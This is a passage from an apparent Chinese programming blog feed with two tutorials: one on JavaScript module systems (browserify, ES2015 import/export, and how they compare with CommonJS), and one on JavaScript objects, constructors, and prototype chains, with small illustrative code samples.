title="browserify:让客户端使用CommonJS规范写法，让客户端可以使用强大的npm生态系统："></a>browserify:让客户端使用CommonJS规范写法，让客户端可以使用强大的npm生态系统：</h4><p>borowserify运行用户之间书写符号CommonJS规范的模块定义，然后经由browserify打包成可之间在浏览器运行的bundle文件：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Module.js:</span><br><span class="line"><span class="keyword">let</span> $ = <span class="built_in">require</span>(<span class="string">'jquery'</span>);</span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">sayName()&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'my name is LuoXia'</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// main.js:</span></span><br><span class="line"><span class="keyword">let</span> &#123;sayName&#125; = <span class="built_in">require</span>(<span class="string">'./Module.js'</span>);</span><br><span class="line">sayName();</span><br></pre></td></tr></table></figure></p><p>然后：</p><pre><code>$ browserify main.js &gt; bundle.js</code></pre><p>就可以把main.js及其依赖模块打包到bundle.js，浏览器引入就是了。详细使用方法参考browserify官方文档。</p><h4 id="拥抱ES2015-Module规范"><a href="#拥抱ES2015-Module规范" class="headerlink" title="拥抱ES2015 Module规范"></a>拥抱ES2015 Module规范</h4><p>刀耕火种的年代已久过去，工业化时代已久到了，而es语言规范本身也在不断进步，前面讲述的种种规范都是”野生”的，当模块化话题被带到官方规范，前后端共用一套规范，让开发成本变得更低。</p><p>关键字：export, import</p><h5 id="定义模块："><a href="#定义模块：" class="headerlink" title="定义模块："></a>定义模块：</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// profile.js</span></span><br><span class="line"><span class="keyword">var</span> firstName = <span class="string">'Michael'</span>;</span><br><span class="line"><span class="keyword">var</span> lastName = <span class="string">'Jackson'</span>;</span><br><span class="line"><span class="keyword">var</span> year = <span class="number">1958</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> &#123;firstName, lastName, year&#125;;</span><br></pre></td></tr></table></figure><p>这里export后面并不是对象，而是表示出口的一系列值，可以用as关键字进行重命名：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span>&#123;firstName <span class="keyword">as</span> name&#125;<span class="comment">//对外提供name</span></span><br></pre></td></tr></table></figure></p><p>注意：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 报错</span></span><br><span class="line"><span class="keyword">export</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 报错</span></span><br><span class="line"><span class="keyword">var</span> m = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">export</span> m;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 报错</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line"><span class="keyword">export</span> f;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 正确</span></span><br><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 正确</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line"><span class="keyword">export</span> &#123;f&#125;;</span><br></pre></td></tr></table></figure></p><h5 id="引用模块："><a href="#引用模块：" class="headerlink" title="引用模块："></a>引用模块：</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;firstName, lastName, year&#125; <span class="keyword">from</span> <span class="string">'./profile'</span>;</span><br></pre></td></tr></table></figure><p>{}内部的变量名需与profile.js模块中的出口变量名一致，顺序没关系。也可以用as重命名：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;firstName <span class="keyword">as</span> name, lastName, year&#125; <span class="keyword">from</span> <span class="string">'./profile'</span>;</span><br></pre></td></tr></table></figure></p><p>如果在一个模块之中，先输入后输出同一个模块，import语句可以与export语句写在一起。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> &#123; es6 <span class="keyword">as</span> <span class="keyword">default</span> &#125; <span class="keyword">from</span> <span class="string">'./someModule'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line"><span class="keyword">import</span> &#123; es6 &#125; <span class="keyword">from</span> <span class="string">'./someModule'</span>;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> es6;</span><br></pre></td></tr></table></figure></p><p>整体加载：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> about <span class="keyword">from</span> <span class="string">'./profile'</span>;</span><br><span class="line"><span class="built_in">console</span>.log(about.firstName);</span><br></pre></td></tr></table></figure></p><p>只执行，无入口：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">'./someModule'</span>;</span><br></pre></td></tr></table></figure></p><p>默认输出：export default</p><p>有时候我们并不知道模块的API，但提供默认输出，这样就可以直接获取默认输出了。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// export-default.js</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'foo'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这时通过import不需要{}因为只有一个变量：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> lala <span class="keyword">from</span> <span class="string">'./export-default'</span>;</span><br></pre></td></tr></table></figure></p><p>这样我们使用一些库，框架的时候会非常方便：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> $ <span class="keyword">from</span> <span class="string">'jquery'</span>;</span><br><span class="line"><span class="keyword">import</span> React <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"><span class="keyword">import</span> ReactDOM <span class="keyword">from</span> <span class="string">'react-dom'</span>;</span><br></pre></td></tr></table></figure></p><h4 id="ES6-Module与CommonJS对比："><a href="#ES6-Module与CommonJS对比：" class="headerlink" title="ES6 Module与CommonJS对比："></a>ES6 Module与CommonJS对比：</h4><h5 id="1-CommonJS的模块是对象，而es6的模块不是对象，是编译时执行的，使得编译时就能够确定依赖关系和输入输出的变量（软一峰前辈原文）"><a href="#1-CommonJS的模块是对象，而es6的模块不是对象，是编译时执行的，使得编译时就能够确定依赖关系和输入输出的变量（软一峰前辈原文）" class="headerlink" title="1. CommonJS的模块是对象，而es6的模块不是对象，是编译时执行的，使得编译时就能够确定依赖关系和输入输出的变量（软一峰前辈原文）"></a>1. CommonJS的模块是对象，而es6的模块不是对象，是编译时执行的，使得编译时就能够确定依赖关系和输入输出的变量（软一峰前辈原文）</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// CommonJS模块</span></span><br><span class="line"><span class="keyword">let</span> &#123; stat, exists, readFile &#125; = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line"><span class="keyword">let</span> _fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="keyword">let</span> stat = _fs.stat, exists = _fs.exists, readfile = _fs.readfile;</span><br></pre></td></tr></table></figure><p>上面代码的实质是整体加载fs模块（即加载fs的所有方法），生成一个对象（_fs），然后再从这个对象上面读取3个方法。这种加载称为“运行时加载”，因为只有运行时才能得到这个对象，导致完全没办法在编译时做“静态优化”。</p><p>ES6模块不是对象，而是通过export命令显式指定输出的代码，输入时也采用静态命令的形式。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ES6模块</span></span><br><span class="line"><span class="keyword">import</span> &#123; stat, exists, readFile &#125; <span class="keyword">from</span> <span class="string">'fs'</span>;</span><br></pre></td></tr></table></figure></p><p>上面代码的实质是从fs模块加载3个方法，其他方法不加载。这种加载称为“编译时加载”，即ES6可以在编译时就完成模块加载，效率要比CommonJS模块的加载方式高。当然，这也导致了没法引用ES6模块本身，因为它不是对象。</p><h5 id="2-模块加载实质不同"><a href="#2-模块加载实质不同" class="headerlink" title="2. 模块加载实质不同"></a>2. 模块加载实质不同</h5><p>CommonJS加载的模块是对值的拷贝，而ES6 Module是对值的引用，这样模块定义文件内部变量的变化会实时反映到依赖文件，而CommonJS不同。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// lib.js</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">let</span> counter = <span class="number">3</span>;</span><br><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">incCounter</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  counter++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// main.js</span></span><br><span class="line"><span class="keyword">import</span> &#123; counter, incCounter &#125; <span class="keyword">from</span> <span class="string">'./lib'</span>;</span><br><span class="line"><span class="built_in">console</span>.log(counter); <span class="comment">// 3</span></span><br><span class="line">incCounter();</span><br><span class="line"><span class="built_in">console</span>.log(counter); <span class="comment">// 4</span></span><br><span class="line"><span class="comment">//模块定义文件的变量counter的变化能够实时反映</span></span><br></pre></td></tr></table></figure></p><h5 id="3-模块的循环加载处理方式不同："><a href="#3-模块的循环加载处理方式不同：" class="headerlink" title="3. 模块的循环加载处理方式不同："></a>3. 模块的循环加载处理方式不同：</h5><p>循环加载：两个脚本互相依赖<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// a.js</span></span><br><span class="line"><span class="keyword">var</span> b = <span class="built_in">require</span>(<span class="string">'b'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// b.js</span></span><br><span class="line"><span class="keyword">var</span> a = <span class="built_in">require</span>(<span class="string">'a'</span>);</span><br></pre></td></tr></table></figure></p><p>这部分内容在这里不讲了，详情参考《es6入门2》相关内容。</p><h4 id="不同的规范有它自己的适用场景，相同的是对模块化开发的追求，作为工程化开发的一部分，模块化开发不仅包括了js的模块化，还包括css-html模板之类的模块化，本文对一系列的标准进行了总结和对比，希望能够传播模块化开发思想，然后让开发变得更高效。"><a href="#不同的规范有它自己的适用场景，相同的是对模块化开发的追求，作为工程化开发的一部分，模块化开发不仅包括了js的模块化，还包括css-html模板之类的模块化，本文对一系列的标准进行了总结和对比，希望能够传播模块化开发思想，然后让开发变得更高效。" class="headerlink" title="不同的规范有它自己的适用场景，相同的是对模块化开发的追求，作为工程化开发的一部分，模块化开发不仅包括了js的模块化，还包括css,html模板之类的模块化，本文对一系列的标准进行了总结和对比，希望能够传播模块化开发思想，然后让开发变得更高效。"></a>不同的规范有它自己的适用场景，相同的是对模块化开发的追求，作为工程化开发的一部分，模块化开发不仅包括了js的模块化，还包括css,html模板之类的模块化，本文对一系列的标准进行了总结和对比，希望能够传播模块化开发思想，然后让开发变得更高效。</h4><h6 id="webpack作为一款新兴的模块化管理和打包工具，其视任意文件都为模块，并打包成bundle文件，相比于browserify更加强大，后面的文章我会对我在实践当中webpack的使用进行总结，将组件化开发，模块化开发，自动化构建结合，探索高效的开发之道。"><a href="#webpack作为一款新兴的模块化管理和打包工具，其视任意文件都为模块，并打包成bundle文件，相比于browserify更加强大，后面的文章我会对我在实践当中webpack的使用进行总结，将组件化开发，模块化开发，自动化构建结合，探索高效的开发之道。" class="headerlink" title="webpack作为一款新兴的模块化管理和打包工具，其视任意文件都为模块，并打包成bundle文件，相比于browserify更加强大，后面的文章我会对我在实践当中webpack的使用进行总结，将组件化开发，模块化开发，自动化构建结合，探索高效的开发之道。"></a>webpack作为一款新兴的模块化管理和打包工具，其视任意文件都为模块，并打包成bundle文件，相比于browserify更加强大，后面的文章我会对我在实践当中webpack的使用进行总结，将组件化开发，模块化开发，自动化构建结合，探索高效的开发之道。</h6>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;之前一篇文章讲过requirejs(amd规范描述)的路径问题，这篇文章对js模块化进行总结，AMD和CMD主要用于客户端的模块化，而CommonJS是Nodejs的规范，由于它们的差异性，也延伸出来一些模块化工具，如broswerify能够让客户端书写Commonjs规范的模块化代码，达到前后端模块公用，webpack支持各种规范的模块化方式，而到后来的ES2015模块化标准，它们的规范及差异就是本文要总结的。&lt;/p&gt;
&lt;p&gt;对于webpack的话，最近研究得比较多，我会在后面的另一篇文章中详细总结一下webpack的东西&lt;br&gt;
    
    </summary>
    
      <category term="前端工程" scheme="http://luoxia.me/code/categories/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B/"/>
    
    
      <category term="模块化" scheme="http://luoxia.me/code/tags/%E6%A8%A1%E5%9D%97%E5%8C%96/"/>
    
      <category term="CommonJS" scheme="http://luoxia.me/code/tags/CommonJS/"/>
    
      <category term="AMD" scheme="http://luoxia.me/code/tags/AMD/"/>
    
      <category term="CMD" scheme="http://luoxia.me/code/tags/CMD/"/>
    
      <category term="ES6 Module" scheme="http://luoxia.me/code/tags/ES6-Module/"/>
    
  </entry>
  
  <entry>
    <title>js对象的深入理解</title>
    <link href="http://luoxia.me/code/2016/07/13/js%E5%AF%B9%E8%B1%A1%E7%9A%84%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3/"/>
    <id>http://luoxia.me/code/2016/07/13/js对象的深入理解/</id>
    <published>2016-07-13T01:47:01.000Z</published>
    <updated>2017-11-16T13:10:06.487Z</updated>
    
    <content type="html"><![CDATA[<p>JavaScript作为一门非常灵活的动态语言，可以有许多不同的编程范式，而面向对象也是其中之一，但是对比传统的面向对象语言，Js有着很多不同，比如原型链的继承方式等等。由于很多容易混淆的概念问题，这篇文章总结一下我在学习和实践当中对js对象的理解。<br><a id="more"></a></p><h6 id="从刀耕火种到工程化开发，从es5到es2015-，语言本身在不断完善，es2015的Class便是将js创建对象的最佳模式和继承的最佳方式规范化，实质还是基于原型对象和原型链，这样就减轻了开发人员的负担，这便是语言的进步吧。"><a href="#从刀耕火种到工程化开发，从es5到es2015-，语言本身在不断完善，es2015的Class便是将js创建对象的最佳模式和继承的最佳方式规范化，实质还是基于原型对象和原型链，这样就减轻了开发人员的负担，这便是语言的进步吧。" class="headerlink" title="从刀耕火种到工程化开发，从es5到es2015+，语言本身在不断完善，es2015的Class便是将js创建对象的最佳模式和继承的最佳方式规范化，实质还是基于原型对象和原型链，这样就减轻了开发人员的负担，这便是语言的进步吧。"></a>从刀耕火种到工程化开发，从es5到es2015+，语言本身在不断完善，es2015的Class便是将js创建对象的最佳模式和继承的最佳方式规范化，实质还是基于原型对象和原型链，这样就减轻了开发人员的负担，这便是语言的进步吧。</h6><h3 id="一-js里的对象是什么？"><a href="#一-js里的对象是什么？" class="headerlink" title="一. js里的对象是什么？"></a>一. js里的对象是什么？</h3><h4 id="js的七种数据类型："><a href="#js的七种数据类型：" class="headerlink" title="js的七种数据类型："></a>js的七种数据类型：</h4><p>基本数据类型：Undefined,Null,Boolean,Number,String，Symbol(es6新增);</p><p>引用数据类型：Object</p><h5 id="它们之间的联系："><a href="#它们之间的联系：" class="headerlink" title="它们之间的联系："></a>它们之间的联系：</h5><p>我们有一个typeof操作符可以判断数据类型，有两个特性情况：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typeof</span> <span class="literal">null</span> <span class="comment">//object</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="function"><span class="keyword">function</span> //<span class="title">function</span></span></span><br></pre></td></tr></table></figure></p><p>可见虽然null是一种基本类型值，但是它表示空的对象引用，这里就有个问题：</p><p>对象为空和空对象引用的区别？</p><h6 id="对象为空"><a href="#对象为空" class="headerlink" title="对象为空:"></a>对象为空:</h6><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> obj = &#123;&#125;;</span><br></pre></td></tr></table></figure><p>看似空空，其实非也，不要忘了，这个对象是继承自Object类型的，而Object原型上又有许多方法和属性，比如toString()等；</p><h6 id="空对象引用："><a href="#空对象引用：" class="headerlink" title="空对象引用："></a>空对象引用：</h6><p>可以类比C/C++的空指针吧，没有任何指向</p><p>你经常会看到：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> str = <span class="string">'hello luoxia'</span>s blog<span class="string">';</span></span><br><span class="line"><span class="string">console.log(str.length);</span></span><br></pre></td></tr></table></figure><p>你会想，奇了怪了，这个str明明是基本数据类型啊，并非对象，为何它会有length属性呢？<br>听我慢慢道来：</p><p>我们在访问str的length属性时，其实内部机制是这样的：</p><ol><li>创建String基本包装类型的实例；</li><li>在实例上调用这个方法</li><li>销毁这个实例</li></ol><p>这你就应该明白了，并不是说str就是对象，而是内部调用了它的基本包装类型实例，基本包装类型实例是对象，当然有属性和方法了。就好比 2.toString();并不是说2是对象，而是它的基本包装类型Number类型的作用呢</p><h6 id="js中一切皆对象，我的理解："><a href="#js中一切皆对象，我的理解：" class="headerlink" title="js中一切皆对象，我的理解："></a>js中一切皆对象，我的理解：</h6><p>对于Object类型毫无疑问，js中数组，函数都是对象，比如数组对象：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> arr = [<span class="number">1</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">4</span>]</span><br><span class="line"><span class="comment">//等价于:&#123;</span></span><br><span class="line"><span class="number">0</span>:<span class="number">1</span>,</span><br><span class="line"><span class="number">1</span>:<span class="number">0</span>,</span><br><span class="line"><span class="number">2</span>:<span class="number">2</span>,</span><br><span class="line"><span class="number">3</span>:<span class="number">4</span>,</span><br><span class="line">length:<span class="number">4</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>而对于基本类型的值，就像刚刚说的，并不是说2就是对象，而是说我吗可以利用他的包装类型对它进行一系列的属性和方法的访问。</p><p>对于es6新增的symbol值，我现在还有个疑问，Symbol值非对象，但是它也有一系列方法和属性，则不就类似的表面它也有其包装类型，那么这个包装类型是什么呢？Symbol? No,我们在创建Symbol值的时候是这样子的：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> sy = <span class="built_in">Symbol</span>(<span class="string">'describtion'</span>);</span><br></pre></td></tr></table></figure></p><p>可以看到并不能new Symbol创建基本包装类型</p><h3 id="二-让我们一起new对象吧（这个我的理解就是封装）"><a href="#二-让我们一起new对象吧（这个我的理解就是封装）" class="headerlink" title="二. 让我们一起new对象吧（这个我的理解就是封装）"></a>二. 让我们一起new对象吧（这个我的理解就是封装）</h3><h4 id="两种方式："><a href="#两种方式：" class="headerlink" title="两种方式："></a>两种方式：</h4><ol><li><p>new+构造函数+()</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> obj = <span class="keyword">new</span> <span class="built_in">Object</span>();</span><br></pre></td></tr></table></figure></li><li><p>对象字面量</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> obj = &#123;</span><br><span class="line">name:<span class="string">'luoxia'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><p>这个构造函数可以是语言本身就有的，就比如Number这个基本包装类型，也可以是自定义的构造函数，而我要讲的主要是自己定义的构造函数，毕竟在实际应用中，往往需要自定义类型满足需求。</p><p>es5及之前版本，js是没有class(类）的说法的，不想java那种，es当中只有构造函数的概念，这在开始，是有些难以理解的，es2015当中，新增了class关键字，但其内部的原理，比如原型继承都是类似的，只是加了语法糖便于更好的理解而已。</p><h4 id="创建对象："><a href="#创建对象：" class="headerlink" title="创建对象："></a>创建对象：</h4><p>先举个栗子<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Obj</span>(<span class="params">name,age</span>)</span>&#123;</span><br><span class="line"><span class="keyword">this</span>.name= name;</span><br><span class="line"><span class="keyword">this</span>.age = age;</span><br><span class="line"><span class="keyword">this</span>.sayName = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">this</span>.name);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> obj1 = <span class="keyword">new</span> Obj(<span class="string">'luoxia'</span>,<span class="number">19</span>);</span><br><span class="line"><span class="keyword">var</span> obj2 = <span class="keyword">new</span> Obj(<span class="string">'Jane'</span>,<span class="number">18</span>);</span><br><span class="line">......</span><br></pre></td></tr></table></figure></p><p>这个和java某个类中的构造函数是那么的相似：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">public <span class="class"><span class="keyword">class</span> <span class="title">Obj</span> </span>&#123;</span><br><span class="line">private <span class="built_in">String</span> name;</span><br><span class="line">private Int age;</span><br><span class="line">Obj(<span class="built_in">String</span> name,int age)&#123;</span><br><span class="line"><span class="keyword">this</span>.name = name;</span><br><span class="line"><span class="keyword">this</span>.age = age;</span><br><span class="line">&#125;</span><br><span class="line">public <span class="keyword">void</span> sayName()&#123;</span><br><span class="line">System.out.println(<span class="keyword">this</span>.name);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>js的构造函数可以在this对象上直接加方法哎。。。这是外观上的差别，而理解js对象，关键是要理解两个核心：原型对象和原型链，而原型链是继承的实现机制，我们先来看看原型对象：</p><h5 id="原型对象："><a href="#原型对象：" class="headerlink" title="原型对象："></a>原型对象：</h5><p>这个东西最好是有图解，但是好麻烦，我还是总结一下我的理解算了吧，需要图解的可以看书或者其它文章</p><p>对于任意一个构造函数（函数），就如上例的Obj,函数也是对象，而函数会自动拥有一个属性，那便是prototype属性，它的值是一个指针，这个指针指向哪里呢，指向的便是这个函数的原型对象，prototype，这个原型对象拥有一个默认的属性constructor,其指向原型对象的拥有者，即构造函数本身:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(Obj.prototype.constructor)<span class="comment">//Obj</span></span><br></pre></td></tr></table></figure></p><p>上述的构造函数的this指向哪里呢？this的话题又是一个很多坑的话题，this的定义本来就是函数赖以执行的环境，当我们通过构造函数实例化一个对象的时候，这个this就指向了这个实例对象，这个实例对象就拥有了上例中初始化的属性和方法，而这些属性和方法都在哪里呢？就是在实例对象上，</p><p>对，没错，这些属性和方法由于通过构造函数的方式初始化，当new Obj()的时候，便初始化给了实例对象，而除了这些自定义初始化的属性和方法，实例对象内部有一个属性：__proto__，这个属性的值也是一个指针，它指向了构造函数的原型对象prototype:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(obj1.__proto__)<span class="comment">//Obj.prototype</span></span><br></pre></td></tr></table></figure></p><p>下面几个情形:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Object</span>.__proto__<span class="comment">//Function.prototype</span></span><br><span class="line"><span class="built_in">Function</span>.__proto__<span class="comment">//Function.prototype</span></span><br><span class="line"><span class="built_in">Function</span>.prototype.__proto__<span class="comment">//Object.prototype</span></span><br><span class="line"><span class="built_in">Object</span>.prototype.__proto__<span class="comment">//null</span></span><br></pre></td></tr></table></figure></p><p>可见，Object构造函数是Function的实例，而Function的原型对象又是Object的实例，即Function继承于Object，任何构造函数，其本身作为对象，它们都是Function的实例，当然__proto__指向Function</p><p>我们会发现，基于构造函数的方式创建对象有一个不足，那就是对于一些公用的方法和属性，我们在实例化不同的对象时，会创建多个本来可以公用的方法，这不就是一种浪费吗？</p><p>再来看看下面的例子：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Obj2</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">&#125;</span><br><span class="line">Obj2.prototype.name = <span class="string">'luoxia'</span>;</span><br><span class="line">Obj2.prototype.age = <span class="number">19</span>;</span><br><span class="line">Obj2.prototype.sayname = <span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">this</span>.name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这个便是基于原型的方式创建对象，所谓基于原型，便是将属性和方法初始化给构造函数的原型对象，而所有通过这个构造函数实例化的对象将共享这些属性和方法，共享有木有，这就有一个问题：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Obj2.prototype.arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line"><span class="keyword">let</span> obj1 = <span class="keyword">new</span> Obj2();</span><br><span class="line"><span class="keyword">let</span> obj2 = <span class="keyword">new</span> Obj2();</span><br><span class="line">obj1.arr.push(<span class="number">4</span>);</span><br><span class="line"><span class="built_in">console</span>.log(obj2.arr);<span class="comment">//[1,2,3,4]</span></span><br></pre></td></tr></table></figure></p><p>有没有发现，两个不同的实例，对一个实例的数据修改，本来不应该反映到另一个实例，但由于它们共享了这个数组的引用，这就导致它们互相牵连，所以，这也是原型创建对象方法的一个不足。</p><p>其中有一个问题要注意，当用对象字面量改变构造函数的原型对象时，会改写原型对象的 constructor属性指向：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Obj2.prototype = &#123;</span><br><span class="line">name:<span class="string">'luoxia'</span>,</span><br><span class="line">age:<span class="number">19</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(Obj2.prototype.constructor)<span class="comment">//Object</span></span><br></pre></td></tr></table></figure></p><p>本该如此，因为此时的原型对象本来就是Object的实例</p><p>我们可以手动的设置它的constructor属性为构造函数</p><h4 id="创建对象的几种模式"><a href="#创建对象的几种模式" 